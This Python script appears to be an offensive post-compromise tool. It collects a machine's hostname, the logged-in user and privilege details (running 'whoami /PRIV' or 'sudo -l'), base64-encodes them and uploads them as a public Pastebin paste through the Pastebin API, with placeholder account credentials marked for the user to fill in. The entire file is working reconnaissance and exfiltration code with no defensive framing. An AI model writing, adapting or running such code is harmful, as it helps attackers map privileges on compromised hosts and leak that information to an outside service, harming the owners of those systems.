import os
import requests
import socket
import subprocess
import base64


def get_data_host():
   all_host = ""
   hostname = f"Hostname : {socket.gethostname()}\n"
   user = f"Userlogin : {os.getlogin()}\n"

   # Windows
   if os.name == 'nt':
      process = subprocess.Popen("whoami /PRIV", stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
      output, error = process.communicate()
      priv = f"Current Privilege : {output.decode()}"
   # Linux or else
   else:
      process = subprocess.Popen("sudo -l", stdin = subprocess.PIPE , stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
      output, error = process.communicate()
      if output != b'':
         priv = f"Current Privilege : \n{output.decode()}"
      elif b"incorrect password" in error:
         priv = f"Current Privilege : \nunknown privilege user, because 3 incorrect password attempts"
      elif error != b'' :
         priv = f"Current Privilege : \n{error.decode()}"

   all_host = hostname + user + priv
   return base64.b64encode(all_host.encode())


def pastebin_upload(title, contents):
	username = 'XXX' # CHANGE 
	password = 'XXX' # CHANGE
	api_dev_key = 'XXX' # CHANGE 
	login_url = 'https://pastebin.com/api/api_login.php'
	login_data = {
		'api_dev_key': api_dev_key,
		'api_user_name': username,
		'api_user_password': password,
	}
	r = requests.post(login_url, data=login_data,timeout=3)
	api_user_key = r.text
	paste_url = 'https://pastebin.com/api/api_post.php'
	paste_data = {
		'api_paste_name': title,
		'api_paste_code': contents.decode(),
		'api_dev_key': api_dev_key,
		'api_user_key': api_user_key,
		'api_option': 'paste',
		'api_paste_private': 0,
	}
	r = requests.post(paste_url, data=paste_data,timeout=3)
	print(f"Status code : {r.status_code}")
	print(f"Link : {r.text}")

if __name__ == '__main__':
	data = get_data_host()
	print("Sent to pastebin")
	pastebin_upload("data_host",data)